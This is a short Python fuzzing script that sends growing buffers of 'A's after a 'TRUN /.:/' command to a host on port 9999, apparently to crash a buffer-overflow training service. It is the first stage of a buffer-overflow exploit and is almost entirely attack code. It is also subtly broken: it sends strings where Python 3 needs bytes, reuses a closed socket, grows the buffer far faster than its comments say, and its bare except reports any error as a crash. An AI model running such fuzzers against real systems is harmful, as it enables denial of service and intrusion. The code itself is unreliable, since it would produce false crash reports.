"#!/usr/bin/python3" 

import sys, socket as so, struct
from time import sleep

#setting the beginning buffer values and increment steps
buffer = "A"
max_buffer = 10000
increment = 200
counter = 100
ip = '192.168.0.1' #IP must be in a string for the socket connection
port = 9999 #port must be an int for the socket connection

def socketCreate():
    try:
        s = so.socket(so.AF_INET,so.SOCK_STREAM)
    except so.error as e:
        print("[!] - error creating socket: %s" % e)
        sys.exit(1)
    return s

def socketConnect(so, ip, port):
    try:
        s.connect((ip, port))
    except so.gaierror as e:
        print("[!] - address related error connecting to socket %s" % e)
        sys.exit(1)
    except so.error as e:
        print("[!] - error connecting to "+str(ip)+", make sure target is listening on port "+str(port)+"\n [-] - connection error: %s" % e)
        sys.exit(1)
        

s = socketCreate()

while len(buffer) < max_buffer:
    try:
        socketConnect(s, ip, port)
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + buffer*increment

    except:
        print("[+] Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit(0)

print("[!] Buffer limit exceeded, fuzzing failed.")
sys.exit(0)
        